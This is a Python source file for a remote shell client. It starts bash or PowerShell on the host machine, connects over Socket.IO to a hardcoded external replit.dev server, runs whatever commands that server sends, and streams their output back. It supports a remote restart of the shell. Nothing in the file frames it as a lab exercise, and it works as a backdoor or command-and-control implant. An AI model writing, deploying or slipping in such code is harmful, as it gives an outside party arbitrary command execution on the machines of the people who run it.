import subprocess
import threading
import platform
import socketio
import sys

def run(data):
    sio = socketio.Client(logger=False, engineio_logger=False)

    system = platform.system()

    global shell

    if system == "Linux" or system == "Darwin":
        shellScript = "bash"
    elif system == 'Windows':
        shellScript = "powershell"
    else:
        shellScript = "bash"

    class InteractiveShell:

        def __init__(self):
            self.process = None
            self.running = False

        def start(self):
            self.running = True
            self.process = subprocess.Popen(
                [shellScript],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                shell=True,
                universal_newlines=True,
            )

            # Start threads for handling output and error
            output_thread = threading.Thread(target=self.read_output, args=(self.process.stdout,))
            error_thread = threading.Thread(target=self.read_output, args=(self.process.stderr,))
            output_thread.start()
            error_thread.start()

            # Wait for both threads to finish
            output_thread.join()
            error_thread.join()

        def read_output(self, pipe):
            while self.running:
                output = pipe.readline().rstrip()
                if output:
                    sio.emit("result", output)

    # Define event handlers outside the class
    @sio.on("command")
    def command(data_new):
        if data['uuid'] == data_new['id']:
            shell.process.stdin.write(data_new['cmd'] + "\n")
            shell.process.stdin.flush()

    @sio.on('restart')
    def restart(data_new):
        global shell  # Declare shell as global to modify it
        if data_new == data['uuid']:
            if shell.process:
                shell.process.terminate()
                shell.running = False
            shell = InteractiveShell()  # Create a new InteractiveShell instance
            shell.start()  # Start the new shell process

    @sio.event
    def connect():
        sio.emit("mConnect", data)
        print(sio.sid)
        print(data["uuid"])

    sio.connect(
        "https://1e26c3bd-d2fc-4199-8c95-28e5c4f20ff4-00-3mijlg2wczefz.riker.replit.dev"
    )

    shell = InteractiveShell()
    shell.start()
    sio.wait()